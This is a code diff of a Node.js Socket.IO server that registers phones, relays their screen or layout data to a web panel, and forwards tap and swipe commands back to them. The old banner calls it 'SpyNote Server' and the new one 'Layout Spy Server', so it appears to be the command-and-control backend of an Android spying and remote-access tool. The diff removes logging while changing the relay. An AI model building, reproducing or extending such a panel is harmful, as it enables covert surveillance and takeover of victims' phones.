@@ -14,7 +14,7 @@ const io = socketIo(server, {
 
 app.use(compression());
 app.use(express.static('public'));
-app.use(express.json({ limit: '50mb' })); // ✅ Large frames OK
+app.use(express.json({ limit: '50mb' }));
 
 const devices = new Map();
 
@@ -22,7 +22,6 @@ app.post('/register', (req, res) => {
     const { deviceId, model, brand, version, status } = req.body;
     if (deviceId) {
         devices.set(deviceId, { model, brand, version, status, connected: true });
-        console.log("✅ Device registered:", deviceId);
         io.emit('devices-update', Array.from(devices.entries()));
     }
     res.json({ success: true });
@@ -44,21 +43,19 @@ io.on('connection', (socket) => {
                 socketId: socket.id 
             });
             socket.join(deviceId);
-            console.log("📱 Device joined room:", deviceId);
             io.emit('devices-update', Array.from(devices.entries()));
         }
     });
 
-    // ✅ Screen frame relay (phone → web)
-    socket.on('screen-frame', (data) => {
+    // 🔥 LAYOUT DATA RELAY (NEW)
+    socket.on('layout-frame', (data) => {
         const deviceId = data.deviceId;
         if (devices.has(deviceId)) {
-            socket.to(deviceId).emit('screen-update', data);
-            console.log('📺 Frame relayed:', deviceId);
+            socket.to(deviceId).emit('layout-update', data);
         }
     });
 
-    // ✅ Control relay (web → phone)
+    // Control relay
     socket.on('control', (data) => {
         const { deviceId, action, x, y, startX, startY, endX, endY } = data;
         if (devices.has(deviceId)) {
@@ -71,18 +68,14 @@ io.on('connection', (socket) => {
                 endX: parseFloat(endX) || 0, 
                 endY: parseFloat(endY) || 0
             });
-            console.log('🎮 Control sent:', action, 'to', deviceId);
         }
     });
 
     socket.on('disconnect', () => {
-        console.log('🔌 Disconnected:', socket.id);
-        // ✅ FIXED: Proper disconnect handling
         for (const [deviceId, info] of devices.entries()) {
             if (info.socketId === socket.id) {
                 devices.set(deviceId, { ...info, connected: false });
                 io.emit('devices-update', Array.from(devices.entries()));
-                console.log('📱 Device disconnected:', deviceId);
                 break;
             }
         }
@@ -91,7 +84,5 @@ io.on('connection', (socket) => {
 
 const PORT = process.env.PORT || 3000;
 server.listen(PORT, () => {
-    console.log(`🚀 SpyNote Server running on port ${PORT}`);
-    console.log(`🌐 Web panel: http://localhost:${PORT}`);
-    console.log(`📱 Ready for devices!`);
+    console.log(`🚀 Layout Spy Server: http://localhost:${PORT}`);
 });
